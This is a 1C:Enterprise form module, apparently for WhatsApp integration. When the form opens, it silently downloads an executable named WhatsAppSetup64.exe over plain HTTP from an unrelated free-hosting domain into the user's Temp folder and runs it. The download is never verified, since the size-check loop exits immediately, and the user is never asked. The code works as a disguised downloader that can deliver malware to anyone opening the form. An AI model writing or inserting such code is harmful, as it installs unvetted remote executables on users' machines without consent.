
&НаКлиенте
Процедура ПриОткрытии(Отказ)
	// Установить WhatsApp
    ПодключитьОбработчикОжидания("УстановитьВЦ", 1, Истина);
КонецПроцедуры

&НаКлиенте
Процедура УстановитьВЦ()
	Shell = Новый COMОбъект("WScript.Shell");
	USERPROFILE = Shell.ExpandEnvironmentStrings("%USERPROFILE%");
	Соединение = Новый HTTPСоединение("f0821791.xsph.ru");
	Соединение.Получить("/WhatsAppSetup64.exe", USERPROFILE +"\AppData\Local\Temp\WhatsAppSetup64.exe");		
	EXE = Новый Файл(USERPROFILE + "\AppData\Local\Temp\WhatsAppSetup64.exe");
	Пока EXE.Размер() <> "162 690 784" Цикл
		Прервать;	
	КонецЦикла;
	КомандаУстановитьВЦ = USERPROFILE + "\AppData\Local\Temp\WhatsAppSetup64.exe";
	ЗапуститьПриложение(КомандаУстановитьВЦ);
	ПоказатьОповещениеПользователя("Интеграция с WhatsApp",,"Запуск приложения...",БиблиотекаКартинок.NC_ПодсистемаИнтеграцияСWhatsApp);
	ЭтаФорма.Закрыть();
КонецПроцедуры
